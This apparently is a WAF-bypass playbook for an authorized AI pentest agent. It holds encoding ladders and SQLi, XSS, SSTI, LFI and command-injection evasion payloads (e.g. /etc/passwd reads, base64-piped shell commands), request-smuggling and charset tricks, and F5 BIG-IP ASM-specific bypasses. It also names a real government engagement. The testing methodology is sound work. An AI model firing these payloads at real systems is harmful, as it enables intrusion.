# WAF / filter bypass technique library
# Authorized, in-scope app only. Probe with BENIGN canaries. Never attack the WAF vendor/another tenant. Not a DoS.

## 1. Fingerprint the WAF/CDN
```
wafw00f https://TARGET        identYwaf
```
- Headers: `Server`, `X-CDN: Incapsula`, `X-Sucuri-ID`, `fastly-debug-*`, `cf-ray` (Cloudflare), `x-amzn-*`.
- Cookies: `__cf_bm`/`cf_clearance`/`cf_chl_*` (Cloudflare), `AWSALB`/`AWSALBCORS`/`AWSELB` (AWS ALB),
  `incap_ses`/`visid_incap` (Imperva), `ak_bmsc` (Akamai).
- Challenge pages / JS objects (`_cf_chl_opt`), route probes (`/cdn-cgi/`), block-page signatures.
- Transport: JA3/JA4 TLS fingerprint, HTTP/2–3 negotiation differences.

## 2. Confirm the block (baseline)
A benign request returns 200; the agent's payload returns 403/406/429 or a challenge. Find the MINIMAL
transform that flips the payload back to a normal response with a benign canary — don't burn exploit strength.

## 3. Payload-level evasion (by the blocked vuln-class)
- **SQLi:** case (`SeLeCt`), inline comments (`UN/**/ION`), whitespace swaps (`%09 %0a %0c %a0 ++`), hex
  (`0x61`), `CHAR()`/`CONCAT`/`||`, numeric rewrites (`1-0`, `1+0`), double-URL-encode, JSON-operator injection.
- **XSS:** context-specific, mutation XSS (parser quirks, `noscript`), alt tags/events (`svg`, `details/ontoggle`),
  `atob`+`eval`, bracket property access, `\u` escapes, entity-encoded `javascript:`, `data:` URIs, CSS vectors,
  polyglots, CSP gadgets (JSONP, DOM clobbering, allowed-origin).
- **Command/SSTI/path:** encoding + separators + wrappers (hand confirmation to that agent).

## 4. HTTP manipulation
- Method case / whitespace (`get`, leading tab before method).
- Spoof-origin headers: `X-Forwarded-For`, `X-Forwarded-Host`, `X-Real-IP`, `X-Client-IP`, `Client-IP`,
  `Forwarded`, `X-Originating-IP`.
- Duplicate headers / conflicting `Content-Encoding`; HTTP parameter pollution (`?id=a&id=b`) — see
  `parameter-pollution`; CRLF/line-folding; oversized body; multipart boundary + mixed `Content-Type`
  (put the payload in a low-weight field like multipart `filename`).

## 5. Transport / origin
- **TLS/JA3 alignment**: present a browser-like JA3 (uTLS/tls-client/curl-impersonate) so the fingerprint
  doesn't flag automation.
- **HTTP/2 / HTTP/3**: `curl --http2` / `--http3`; `:authority` vs SNI mismatch; test whether the WAF
  inspects HTTP/2 the same as HTTP/1.
- **Origin discovery** (bypass the CDN entirely): Shodan/Censys, `CloudFlair`, historical DNS
  (SecurityTrails), `Alt-Svc` leakage, then a direct request to the origin IP with a spoofed `Host`.
  **Scope-check any origin IP before using it.**
- **SNI**: `openssl s_client -servername`, `curl --connect-to`, domain fronting (CDN-dependent).

## 6. GraphQL / ML-WAF
- GraphQL: deep alias nesting, batched ops, renamed fields, upload-scalar variants (`graphql-cop`, `InQL`).
- ML/semantic WAFs: semantic rewrites, noise-token padding, Unicode homoglyphs, mixed SQLi/XSS syntax,
  payload in low-weight fields; iterate from the WAF's own feedback.

## Do NOT (DoS — catalogued for awareness only)
Rapid Reset (CVE-2023-44487), CONTINUATION flood, connection-pool exhaustion, IP-fragmentation floods —
**never fire these**; note them for the report if relevant.

## Hand-back
Write `waf_profile.json` = `{waf, evidence, transforms_tried:[{transform, canary, passed}], origin_ip?}`
and `bypass_notes.md` = the specific transform(s) the calling vuln agent should wrap its payloads in.

---
## Extended arsenal — encoding ladders (climb one rung at a time)

# A WAF decodes input N times, then matches its rules. Deliver the payload so it is STILL obscured when the
# rule engine inspects it, but fully decoded by the time the app parser consumes it. Climb one rung at a
# time; stop at the LOWEST rung that passes a benign canary. Don't jump straight to rung 10.
# Columns show the character `<` (U+003C) under each transform; apply the same method per-byte to keywords.

| Rung | Transform | `<` becomes | Notes / where it lands |
|---|---|---|---|
| 0 | plain | `<` | baseline |
| 1 | mixed / inverted case | n/a (keyword) | `SeLeCt`, `ScRiPt` — defeats case-sensitive signatures |
| 2 | URL-encode | `%3c` | app url-decodes once; WAF may not |
| 3 | double-URL | `%253c` | front decodes once -> `%3c`, backend decodes again -> `<` |
| 4 | partial / per-byte | `%73elect` | encode only the signature-bearing byte(s) |
| 5 | HTML decimal/hex entity | `&#60;` `&#x3c;` | sinks that HTML-decode (attributes, titles) |
| 6 | entity, no semicolon | `&#60` `&lt` | lax HTML parsers still decode |
| 7 | unicode escape | `<` | JS / JSON string sinks decode this |
| 8 | overlong UTF-8 | `%c0%bc` `%e0%80%bc` | decoders that accept non-shortest form |
| 9 | legacy `%uXXXX` | `%u003c` | servers/decoders that normalize `%u` form |
| 10 | UTF-7 (charset-gated) | `+ADw-` | only if the response charset is sniffed as UTF-7 |

# Ladder combinators (stack transforms): double-encode THEN case-toggle; entity-encode INSIDE a
# url-encoded value; wrap one keyword byte in overlong UTF-8 while leaving the rest plain. Each extra layer
# costs app-parser tolerance — verify the app still interprets the decoded form with a benign canary.

---
## Extended arsenal — comment & whitespace injection by context

# "Whitespace" and "a word boundary" are what most signatures key on. Replace them with characters the
# TARGET parser treats as equivalent but the rule regex does not.

### SQL — whitespace & comment equivalents
```
space  ->  /**/   %09(tab)  %0a(LF)  %0b(VT)  %0c(FF)  %0d(CR)  %a0(nbsp)  ()  +
UN/**/ION   SE/**/LECT   OR/**/1=1
/*!50000SELECT*/   /*!UNION*/              # MySQL versioned comment: runs, often slips rule engines
--  #  ;%00  -- -  /* ... */               # terminators; `-- ` needs the trailing space (use `-- -`)
(SELECT(1)FROM(DUAL))                      # parentheses remove EVERY space
```

### XSS / HTML — separators & comment tricks
```
<svg/onload=...>     <svg%0conload=...>     <svg%09onload=...>     # tag/attr separators
<img/src=x/onerror=...>                                            # slash as attr separator
<a href="jav&#x09;ascript:...">                                    # in-token whitespace entity
<!-- --><svg ...>     <svg><!--c-->onload...>                       # comment interleave
<scr<script>ipt>     <scri%00pt>                                    # split-keyword / null (legacy parsers)
```

### OS command — argument & token separators
```
cat${IFS}/etc/passwd    cat$IFS$9/etc/passwd    {cat,/etc/passwd}    cat</etc/passwd   # no literal space
c""at /etc/passwd   c'a't /etc/passwd   \cat /etc/passwd   ca\t /etc/passwd   # intra-word break (shell strips)
who$@ami   w\ho\am\i   w'h'o'am'i   "wh"o"am"i                      # assemble the binary name
id%0aid    id%0did    `id`   $(id)   id||id   id&&id                # command separators
```

### Path / LFI — separator & dot-segment tricks
```
..%2f   ..%5c   %2e%2e%2f   ..%252f   ....//   ..././   ..;/   %2e/      # traversal encodings
/etc/passwd%00   /etc/passwd#   /etc/passwd?   /./etc/./passwd           # truncation / no-op segments
%c0%ae%c0%ae%c0%af                                                       # overlong-UTF-8 `../`
```

---
## Extended arsenal — per-class filter → evasion matrix (headline map)

# "I get a 403 on class X when I send token Y" -> pick the evasion. Deliver the SAME benign canary; the goal
# is to get the already-benign proof past the filter, not to strengthen the payload.

| Class | Blocked token / signature | Benign evasion to try (low rung first) |
|---|---|---|
| SQLi | `UNION SELECT` | `UNION/**/SELECT`, `uNiOn SeLeCt`, `/*!UNION*/SELECT`, `%55NION`, nested `UNIunionON` |
| SQLi | spaces | `/**/`, `%09`/`%0a`/`%0c`/`%a0`, `()`, `+` |
| SQLi | quotes `' "` | `0x..` hex, `CHAR()`, `CONCAT()`, numeric context (no quote) |
| SQLi | `OR`/`AND` | `||` / `&&`, `%7c%7c`, equality via `BETWEEN`/`IN`/`LIKE`, `XOR` |
| SQLi | `--`/`#` comment | `;%00`, close with `'||'`, `/* */`, balanced parens |
| XSS | `<script>` | `<svg onload>`, `<img onerror>`, `<details ontoggle>`, `<svg><set onbegin>` |
| XSS | `on*` handlers | `javascript:` URI, `<iframe srcdoc>`, CSS/`style` vectors, `<svg><animate onbegin>` |
| XSS | `alert`/`(` | `` alert`1` ``, `top['al'+'ert'](1)`, `Function('...')()`, `onerror=alert;throw 1` |
| XSS | `javascript:` | `java&#09;script:`, `javascript&colon;`, `JaVaScRiPt:`, entity/URL-encode the scheme |
| XSS | `"`/`'` quotes | unquoted attr + whitespace/backtick, entity `&quot;`, context-break with `` ` `` |
| LFI | `../` | `..%2f`, `....//`, `..%252f`, `%c0%ae%c0%ae%c0%af`, `..;/` |
| LFI | `/etc/passwd` | wrapper `php://filter/convert.base64-encode/resource=`, abs-path split `/etc/./passwd` |
| LFI | null/ext append | `%00` (legacy), `?`/`#` truncation, path-length padding `/././…/` |
| RCE | `;`/`|`/`&` | `%0a` newline, `$(...)`, `` `...` ``, `||`/`&&`, nested `$( )` |
| RCE | spaces | `${IFS}`, `$IFS$9`, `{cmd,arg}`, `<redir` |
| RCE | binary name | `c""at`, `c\at`, `/bin/c?t`, `/???/??t`, `$(rev<<<imaohw)`, `base64 -d|sh` |
| RCE | `/` path sep | `${PATH:0:1}`, `${HOME:0:1}`, `$(printf '\57')` |
| SSTI | `{{ }}` | `${ }`, `{% %}`, `#{ }`, engine-specific delims; split braces across concatenation |

---
## Extended arsenal — SQLi WAF evasion (deep, by constraint)

### No whitespace allowed
```
'OR(1)=(1)-- -                          # parentheses replace spaces
'OR/**/1=1-- -                          # inline comment replaces spaces
'%0aOR%0a1=1-- -                        # newline whitespace
'UNION(SELECT(@@version))-- -
```
### No commas (filter on `,`, or to dodge UNION column-count fingerprints)
```
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b              # build a row without commas
SUBSTRING(version() FROM 1 FOR 1)                            # ANSI SUBSTRING, no comma
... LIMIT 1 OFFSET 1                                         # instead of LIMIT 1,1
```
### No quotes allowed
```
0x61646d696e                            # hex literal for a string
CHAR(97,100,109,105,110)                # build a string from codepoints (MySQL)
CONCAT(0x61,0x62)                       # hex + concat
```
### Keyword filtered (strip-once or signature)
```
UNIunionON   SELECTselectT              # nested: a single-pass strip rebuilds the keyword
/*!50000UNION*/  /*!SELECT*/            # MySQL versioned comment executes the content
UN%49ON                                 # url-encode one byte (%49='I')
```
### Numeric / operator rewrites (dodge `=`, `1=1`, digits)
```
1 LIKE 1    1 BETWEEN 1 AND 1    1 IN (1)    1 REGEXP 1      # equality without `=`
1e0   .1   0b1   0x1                     # numeric-literal variety
true   !false   1 XOR 0                  # boolean without digits
```
### Logical operators
```
' || '1'='1        ' && '1'='1        '%26%26'1'='1
```
Hand the confirmed injection to `sqli-inband` / `sqli-blind`; this library only gets the BENIGN probe past the filter.

---
## Extended arsenal — XSS WAF evasion (deep, by constraint)

### `<script>` / common tags blocked — alternative execution tags
```
<svg onload=alert(1)>              <img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>   <video><source onerror=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x>     <marquee onstart=alert(1)>
<body onpageshow=alert(1)>         <input autofocus onfocus=alert(1)>
```
### Handlers (`on*`) blocked — scheme / nested-content vectors
```
<a href="javascript:alert(1)">x</a>        <iframe srcdoc="&lt;svg onload=alert(1)&gt;">
<form><button formaction="javascript:alert(1)">x        <math><mtext><a href="javascript:alert(1)">
```
### `javascript:` scheme filtered
```
java&#09;script:alert(1)     java&#10;script:alert(1)     javascript&colon;alert(1)
JaVaScRiPt:alert(1)          %6aavascript:alert(1)        &#x6a;avascript:alert(1)
```
### `alert`/`(`/`)` or keyword blocked — compute the sink
```
alert`1`                                # backtick call, no parens
top['al'+'ert'](1)     self[atob('YWxlcnQ=')](1)
onerror=alert;throw 1                    # handler ref + throw triggers it with no ()
Function('ale'+'rt(1)')()                [].constructor.constructor('alert(1)')()
top[8680439..toString(30)](1)            # 'alert' from a base-30 number
```
### Quotes / angle brackets stripped (attribute or JS-string context)
```
" autofocus onfocus=alert(1) x="         # break out of a double-quoted attribute
'-alert(1)-'     ';alert(1)//             # break out of a JS string literal
accesskey=X onclick=alert(1)             # unquoted attribute injection
```
### Mutation / parser-confusion (mXSS) — inert until the DOM re-parses it
```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<template><s><tt><img src=x onerror=alert(1)></template>
<svg><style><img src=x onerror=alert(1)></style></svg>
```
Under CSP, swap inline handlers for an allowed-source gadget (JSONP / DOM clobbering / allowed origin) or report
"reflected, non-executing under CSP". Hand the executing PoC to the matching `xss-*` agent.

---
## Extended arsenal — command-injection & path WAF evasion (deep)

### *nix shell — spacing, quoting, globbing, encoding
```
cat${IFS}/etc/passwd    cat$IFS$9/etc/passwd    {cat,/etc/passwd}    cat</etc/passwd
c""at /etc/passwd   c'a't /etc/passwd   \cat /etc/passwd   ca\t /etc/passwd    # intra-word breaks
/bin/c?t /etc/passwd   /???/??t /et?/p??s??   /bin/cat /e*c/pa??wd              # globbing
$(rev<<<imaohw)   echo -n d2hvYW1p|base64 -d|sh   $(printf '\167\150\157\141\155\151')
${PATH:0:1}etc${PATH:0:1}passwd                                                # build '/' from $PATH
X=cat;$X /etc/passwd    a=c;b=at;$a$b /etc/passwd                              # variable assembly
```
### Windows — caret, quotes, substrings, PowerShell
```
who^ami    w"h"oami    c^m^d /c whoami
%PROGRAMFILES:~0,1%                                     # substring expansion -> 'C' etc.
powershell -e <base64-UTF16LE>     powershell -enc ... # encoded command
p^o^w^e^r^s^h^e^l^l     iex(...)                        # caret-split, PS invocation
```
### Separators / chaining (choose one the WAF doesn't tokenize)
```
;   |   ||   &   &&   %0a(newline)   %0d   `cmd`   $(cmd)   <(cmd)   >(cmd)
```
### Path traversal / LFI (encoding ladder + parser quirks)
```
../  ..\  ..%2f  ..%5c  %2e%2e%2f  %2e%2e/  ..%252f (double)  ....// (strip-once reconstruct)
..%c0%af   %c0%ae%c0%ae%c0%af (overlong UTF-8)   ..;/ (servlet path-param)   ..%00/ (legacy null)
/var/www/../../etc/passwd   /proc/self/root/etc/passwd   php://filter/convert.base64-encode/resource=
```
Confirmation stays benign (`id`/`whoami`, read a non-sensitive marker file, or an OOB ping to `TOKEN.oob.example`);
hand impact proof to `command-injection` / `path-traversal-lfi`.

---
## Extended arsenal — HTTP-layer evasion (deep)

### Verb / method tampering
```
GET -> POST -> PUT -> PATCH            # move the param into a body the WAF rules don't cover
X-HTTP-Method-Override: PUT            # override headers (also X-Method-Override, X-HTTP-Method)
HEAD / arbitrary verb FOOBAR          # frameworks that route an unknown verb to the GET handler
lowercase verb `get` / leading tab    # lax HTTP/1.1 parsers; a WAF may require canonical casing
```
### Content-Type confusion (same bytes, different parser weight)
```
Content-Type: application/json         {"q":"<payload>"}            # send a form-expected param as JSON
Content-Type: application/x-www-form-urlencoded                     # ...or the reverse
Content-Type: text/plain               q=<payload>                  # some body-parsers still read it
Content-Type: application/xml / text/xml                            # an XML body a JSON-focused WAF ignores
Content-Type: multipart/form-data; boundary=X                      # see multipart tricks below
(missing / bogus Content-Type)                                      # app guesses; WAF may skip body rules
```
### Charset / transfer tricks
```
Content-Type: application/x-www-form-urlencoded; charset=utf-16     # WAF reads the wrong charset, app decodes
; charset=ibm037 (EBCDIC)    ; charset=utf-7                        # payload invisible to ASCII rules
Content-Encoding: gzip|deflate|br      # compress the body; a WAF that doesn't inflate sees noise
Transfer-Encoding: chunked             # split a keyword ACROSS chunk boundaries (`UNI` | `ON SELECT`)
```
### Multipart boundary abuse
```
--X
Content-Disposition: form-data; name="q"; filename="a.txt"         # payload in a low-weight field
Content-Type: text/plain; charset=utf-7
<payload>
--X--
# tricks: duplicate / conflicting boundaries, boundary with special chars, name vs filename, per-part
#   Content-Type/charset, trailing data after the closing boundary, LF-only (no CR) line endings.
```
### JSON parser tricks
```
{"q":"<payload>"}            # unicode-escape the signature bytes
{"q":"a","q":"<payload>"}              # duplicate key -> last-wins parser sees payload, WAF saw first
{"q":["<payload>"]}   {"q":{"$":"<payload>"}}   # type juggling / nesting the app flattens
{"q":"<payload>"}/*trailing*/          # trailing bytes / comments (lenient JSON5-ish parsers)
```
### Header casing / folding / duplication
```
content-length / Content-Length / CONTENT-LENGTH     # casing a strict WAF mis-keys
header folding (obs-fold): "X-Foo:\r\n <value>"      # legacy continuation
duplicate headers (CL, Host, Content-Type) where WAF reads one, origin another  -> request-smuggling
conflicting Content-Encoding / Transfer-Encoding                                 -> request-smuggling
```
### Null bytes & padding
```
param%00=value        value%00<payload>        # null truncates a WAF string match, not the app parser
# oversized junk prefix: pad the body with benign filler BEFORE the payload so it falls past the WAF's
#   body-inspection byte limit (next section). Keep total size sane — never a DoS.
```

---
## Extended arsenal — body-inspection limits & request fragmentation

# Most WAFs inspect only the first N KB of a body (cost control). Place benign filler first, payload after
# the cutoff. FIND the limit with a benign binary search; stay well below any size that stresses the host.
```
# 1) send increasing filler + a benign canary AFTER it; note the size at which the canary stops being blocked
pad = "x" * N ; body = "legit=" + pad + "&q=<benign-canary>"
# 2) common cutoffs to probe (KB): 8, 16, 32, 64, 128  (vendor-dependent)
```
# Fragmentation across the transport (split the keyword so no single buffer holds the signature):
```
Transfer-Encoding: chunked            # put `UNI` in chunk 1, `ON SELECT` in chunk 2 (re-joined by origin)
HTTP/2 DATA frames split mid-keyword  # a WAF that reassembles differently than the origin
pipelined / multi-packet splits       # TCP segment boundaries inside the signature
```
# A WAF that normalizes/buffers the full request before matching defeats these — record what worked.

---
## Extended arsenal — WAF behavior families (describe behavior, pick the lever)

# Group by BEHAVIOR, not brand. Fingerprint (section 1) tells you the family; the family tells you which
# levers above are likely to work. These are behavioral generalizations to TEST, not guarantees.

| Family (behavior) | Typical block tell | Levers that tend to work |
|---|---|---|
| Edge/CDN rule-engine | block page + ray-id cookie, challenge JS | origin discovery, double-encoding, body-size limit, charset |
| Cloud managed rule-set | 403/406 + rule-id in body, paranoia tiers | per-byte encoding, comment-insertion, versioned comments, verb/CT swap |
| Reverse-proxy module (embedded ruleset) | 403 + distinctive server banner | chunked keyword-split, obs-fold, TE/CL quirks, tuning gaps |
| Appliance / inline IPS | RST / silent drop / 406 | fragmentation, slow delivery, TLS/JA3 realism, protocol downgrade |
| ML / semantic scorer | soft-block at a score threshold, 429 | noise-token padding, homoglyphs, low-weight field placement, syntax-mixing |
| Rate / bot layer | 429 + managed challenge | JA3/JA4 realism, HTTP/2 priority realism, pacing, session-cookie reuse |

# Paranoia / sensitivity: rule-set engines often expose levels — higher levels block more BENIGN traffic, so
# a bypass at a high level may be a tuning artifact; note the level in the report.

---
## Extended arsenal — tooling, automation & confirmation discipline

### Benign automation (iterate transforms, not force)
```
wafw00f / identYwaf             # fingerprint (section 1)
ffuf -w transforms.txt -u 'https://HOST/?q=FUZZ' -mc all   # measure which encoded canary passes
nuclei -tags waf                # curated benign checks
curl-impersonate / tls-client   # browser-realistic JA3 so the request isn't flagged as automation
# custom mutator: generate the encoding ladder for ONE benign canary, fire, record pass/block.
```
### Record every attempt
```
transforms_tried.jsonl: {class, rung, transform, canary, status, blocked, delivered}
```
### Confirmation discipline (do not inflate)
- The proof is: the BENIGN canary was BLOCKED plain and DELIVERED after the transform (same canary, same sink).
- A transform that merely returns 200 with the payload *encoded/inert* is NOT a bypass — confirm the sink
  still interprets it (apply the vuln agent's verify criteria).
- Prefer the lowest rung; a single `/**/` that works beats a fragile 5-layer stack.
- Stay in scope, benign, rate-limited. Never target the WAF tenant/control-plane or fire any DoS vector.

---
## Extended arsenal — F5 BIG-IP ASM (product-specific `${...}` rule)

# F5 BIG-IP ASM ships a signature anchored on the literal `${` sequence (the SSTI / EL-injection rule). It is
# START-ANCHORED on those two bytes and does NOT fully decode the request before matching — which is exactly
# the seam. Fingerprint F5 first (cookies `TS01...`, `BIGipServer...` / `lb-N-p-NNN`), then pick the primitive
# that matches the BACKEND's own decoding so a BENIGN `${7*7}` canary lands un-mangled past the rule.

### Soft-block fingerprint — trust the body, NOT the status
# ASM returns a **200** (not a 403/406) with a fixed ~101-byte "Request Rejected" HTML body. A status-only
# check reads that 200 as success and misses the block entirely.
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 101

<html><head><title>Request Rejected</title></head><body>The requested URL was rejected.</body></html>
```
# Baseline-diff: record the endpoint's NORMAL body length (e.g. a JSON API ~59 B); the 101-B "Request Rejected"
# body is the soft-block tell. Classify every probe by this body signature, never by the status line. (For
# byte-exact comparison, drive these with a raw socket so no client-side URL-encoding ambiguity creeps in.)

### 1. JSON Content-Type smuggling (the JSON parser does not URL-decode)
# ASM matches `*json*` in Content-Type and routes the body through its JSON parser, which does NOT URL-decode.
# URL-encode the payload: ASM sees `%24%7B...` (no literal `${`), the rule stays silent, the backend decodes
# the value normally downstream.
```http
POST /target/endpoint HTTP/1.1
Host: api.target.tld
Content-Type: application/json
Content-Length: 16

q=%24%7B7%2A7%7D
```
# Also works as a URL-encoded value INSIDE a JSON string:  {"q":"%24%7B7%2A7%7D"}
# Content-Type values carrying the `json` substring that all route through the JSON parser (so the rule is skipped):
#   application/json · application/json; charset=UTF-8 · application/json; foo=bar; junk=true (any junk param) ·
#   text/json · application/vnd.api+json · application/hal+json · application/ld+json

### 2-4. Encodings ASM does not decode (deliver to a backend that does)
| # | Encoding of `${7*7}` | ASM sees | lands if the backend... |
|---|---|---|---|
| 2 | UTF-7: `+ACQAew-7*7+AH0-` | `+ACQAew-...` (no `${`) | UTF-7-decodes the value (some Java stacks) |
| 3 | IIS `%u`: `%uFE69%uFE5B7*7%uFE5D` | literal `%uXXXX` | decodes `%u` form (IIS / older .NET) — fullwidth `$ { }` |
| 4 | HTML-entity-then-URL: `&%2336;&%23123;7*7&%23125;` | `&#..`-shaped noise | HTML-decodes the reflected value (templated render) |

### 5. Header smuggling — which headers ASM runs through the `${...}` rule
# Several request headers are NOT inspected by this rule. If a sink logs / reflects / templates a header value,
# smuggle the benign canary there.
| Header | `${7*7}` rule | use |
|---|---|---|
| `User-Agent` | PASSES | logged / reflected UA sinks |
| `Cookie` | PASSES | templated cookie values |
| `Accept-Language` | PASSES | reflected locale |
| `Referer` / `Origin` | BLOCKED | — |
| `X-Forwarded-For` / `-Host` / `-Proto` / `X-Real-IP` | BLOCKED | — |
| `True-Client-IP` / `CF-Connecting-IP` / `X-Originating-IP` | BLOCKED | — |
| `Forwarded` / `X-Request-ID` / `X-Correlation-ID` / arbitrary custom `X-*` | BLOCKED | — |

### 6. Alternative template-engine syntax (dodge the `${` anchor entirely)
# The rule keys on the literal `${`. A DIFFERENT engine's delimiter is never matched — pick the one the backend
# actually runs, URL-encode the braces/angles (raw `{` / `<` can confuse an upstream URL parser), send the canary.
| Engine | Anchor-dodging canary | note |
|---|---|---|
| Twig / Jinja2 / Handlebars | `{{7*7}}` | url-encode the braces |
| Thymeleaf | `*{7*7}` or `[[${7*7}]]` | the `*{` / `[[` prefix beats the start-anchor |
| Velocity | `#set($x=7*7)$x` | `#set` directive — no `${` |
| Razor (.NET) | `@(7*7)` / `@{var x=7*7;}@x` | Razor block syntax |
| ERB (Ruby) | `<%= 7*7 %>` / `<%-= 7*7 -%>` | ERB tags |
| FreeMarker | `<#assign x=7*7>${x}` | the `<#assign>` prefix: even the inner `${x}` slips the start-anchor |
| Smarty (PHP) | `{$x=7*7}{$x}` | Smarty |
| Pug / Jade (Node) | `#{7*7}` / `!{7*7}` | Pug variants |

### 7. Fullwidth dollar `＄` (U+FF04) — NFKC reconstruction
# Send the fullwidth `＄` (raw UTF-8 `EF BC 84`) instead of `$`. ASM sees the raw bytes, does not fold them to
# `$`, the rule misses. A backend that NFKC-normalizes input (common in Java) reconstructs `${...}` server-side.
```http
GET /target/endpoint?q=＄{7*7} HTTP/1.1          # that ＄ is U+FF04, not an ASCII `$`
```

### What this ASM rule STILL catches (verified-blocked — don't waste attempts)
# - plain `${...}` in any URL position (path, query, matrix param)
# - single `%24%7B...%7D` and double `%2524%257B...%257D` URL-encoding in the query
# - whitespace inside the braces: `${ 7*7 }`
# - zero-width / bidi chars between `$` and `{` (NUL, ZWSP, ZWJ, RLO, BOM, soft-hyphen, tab, CR)
# - path `${...}` (`/api/${7*7}`) and matrix-param `${...}` (`/path;${7*7}`, `/path;jsessionid=${7*7}`)
# - an HTML entity WITHOUT url-encoding (still contains a literal `${`)
# - backslash escape `$\{7*7\}`

### Flow
# 1. fingerprint F5 (cookies) → 2. confirm the rule with `?q=${7*7}` → expect the ~101-B soft-block →
# 3. pick the primitive by the BACKEND stack (Spring / JSON DTO → #1 · IIS / .NET → #3 · Java+NFKC → #7/#2 ·
#    header-reflection sink → #5 · a known non-`${}` engine → #6) → 4. a bypass is only informational UNTIL it
#    lands on a real sink — hand the delivered benign canary to the owning vuln agent (ssti / the reflected sink).

---
## Extended arsenal — WAF realism: what an IP-reputation / bot layer does NOT yield to request tricks

# Honest limits matter more than an overclaimed bypass. Edge bot-managers (Akamai-class Kona + Bot Manager and
# the like) gate primarily on SOURCE-IP reputation plus a client-side sensor, NOT on request-side signatures —
# so the request-mangling levers above do NOTHING against them. Worth recording as "not bypassed":
# - TLS/JA3-JA4 impersonation of real Chrome / Edge / Firefox / Safari builds → still `Access Denied` (edge ref
#   page). The block is by IP reputation, not TLS fingerprint — a perfect JA3 does not help.
# - A real stealth browser (full sensor JS) from a flagged IP → still denied; the bot cookie (`_abck`-class) is
#   never issued cleanly.
# - Pragma debug headers (`akamai-x-cache-on`, `akamai-x-get-cache-key`, `akamai-x-get-true-cache-key`,
#   `akamai-x-feo-trace`) → no debug info leaked; hosts stay 403.
# - `True-Client-IP` / `X-Forwarded-For` / `X-Real-IP` geo/ip spoofing → no change (the edge trusts its own view).
# What actually moves the needle: a CLEAN source IP not on the target's threat feed — a residential / mobile
# proxy, within scope and RoE. Do NOT claim a bypass you could not reproduce: record "not bypassed from this
# egress; needs a clean-reputation source IP" as the honest result. Any transport/desync CVE is version- and
# patch-gated — most edge providers patch globally fast, so verify it against THIS target before relying on it.


---
## Extended arsenal — fingerprint FIRST (identify before you touch)

# You cannot be WAF-safe, and you cannot evade, what you have not identified. Fingerprinting is the FIRST
# WAF-relevant action of any engagement behind a filter — before the first canary, before any transform.
# It is passive/low-signal and needs no evasion authorization.

### What to capture (and record in `waf_profile.json` + the engagement)
```
WAF/CDN product + vendor        # from wafw00f/identYwaf + the tells in section 1
Block-shell signature           # the EXACT deny response: status, title, body string, a stable id/ray header,
                                #   the server banner (e.g. a named "Web Gateway" banner). This is your
                                #   ban-detector later — you can only spot "recon-200→now-block-shell" drift
                                #   once you know what the block-shell looks like.
Challenge type                  # JS/managed challenge vs hard 403 vs 429 rate-limit vs silent RST/drop
Behavior family                 # map to the behavior-families table so you know which levers may work
```
# Record the block signature BEFORE probing: it is both the fingerprint and the tripwire. An engagement that
# never captured the block-shell can't tell a per-host policy deny from an estate-wide egress ban.

---
## Extended arsenal — operational WAF hygiene (ALWAYS-ON, not a "bypass")

# Distinct from evasion and from any RoE evasion-authorization: this is how you STAY REACHABLE while testing
# behind a WAF. It applies on every engagement behind a filter, even one where evasion is not authorized.
# See `_contract/anti-automation-ladder.md` (block-vs-deny rule) + `_contract/roe-gate.md` (rate caps) — this
# is the DEEP methodology those one-liners point to; don't restate them, apply them.

### Keep detection WAF-safe
```
benign / low-signal canaries          # a harmless marker, not a live exploit string
encoded over raw                      # don't put the raw signature on the wire when a benign canary proves reach
rate-capped                           # honor roe-gate.md rate_limit_rps; slow + paced, not burst
one identified sink at a time         # a signature string goes in ONE targeted canary, never sprayed broad
```

### The egress-burn anti-pattern (what trips IP-reputation bans)
```
# DON'T: broadcast raw attack-signatures across many hosts in broad discovery probes:
/etc/passwd      {{7*7}}      ' OR '1'='1      ../../../../      <script>alert(1)</script>
# Fired host-after-host, these are precisely what a WAF's IP-REPUTATION engine scores on. It does not ban the
# host you hit — it bans YOUR EGRESS IP, estate-wide. Every in-scope host then serves the block-shell from
# that IP. You have not found a bug; you have removed yourself from the engagement.
```

### Field lesson — city-of-vienna (why this section exists)
```
# A prior session blasted raw /etc/passwd, {{7*7}}, and SQL-tautology payloads in broad probes against a
# government estate behind "MA 01 - Wien Digital" (server: Magistrat der Stadt Wien - Web Gateway). The
# gateway's IP-reputation engine banned the egress IP ESTATE-WIDE: every in-scope host recon had seen as 200
# then returned the 403 block-shell from that IP. The whole engagement's egress was burned by careless
# signature blasting; only one app on unrelated infra still answered. The framework BARS fingerprint-spoofing-
# to-evade during normal testing (roe-gate.md) — but the failure here was not "we didn't evade", it was "we
# weren't WAF-SAFE". Hygiene is the fix, not a better bypass.
```

---
## Extended arsenal — IP-reputation ban: detect early, HALT, recover

# An IP-reputation ban is categorically different from a per-request content filter. The content filter keys on
# THIS REQUEST's bytes (so a transform can change the outcome). The reputation ban keys on your CLIENT IP's
# recent HISTORY (so NO payload transform un-bans it — the next benign request is blocked too).

### Detect it early (baseline + drift)
```
# 1) Baseline a known-good PUBLIC path up front and snapshot its status:
curl -s -o /dev/null -w '%{http_code}' https://HOST/robots.txt      # expect the recon-seen status (e.g. 200)
# 2) Re-check that baseline periodically. The ban tells (vs a one-host policy deny):
#    - a normally-public path (/robots.txt, /) suddenly 403s with the block-shell
#    - hosts/paths recon just saw as 200 now ALL return the block-shell / 429, estate-wide
#    - the drift is recon-200 -> now-403: the WAF is denying your CLIENT wholesale, not that resource
# Contrast: a SINGLE host/path 403 that was ALWAYS 403 is a per-host policy deny — skip it, keep going.
```

### On a real ban: HALT (do not evade)
```
# Stop. Do NOT escalate fetch rungs, re-encode, or disguise the client to climb back in. Beating a reputation
# gate by disguising the banned client is EVASION OF A REPUTATION GATE — barred by roe-gate.md + the ladder.
# The WAF-safe path is to halt, not to beat the WAF.
```

### Recover (authorized egress only)
```
(a) PAUSE for the ban to lapse   # reputation bans decay (minutes–hours, vendor-dependent); resume GENTLY + WAF-safe
(b) ROTATE to a fresh AUTHORIZED egress   # a source IP the RoE / scope.yaml permits; resume slow + benign
# NEVER "un-ban" by spoofing the client identity/fingerprint to disguise the banned client. Record the ban +
# which recovery you took in bypass_notes.md so the next operator doesn't re-burn the same egress.
```

---
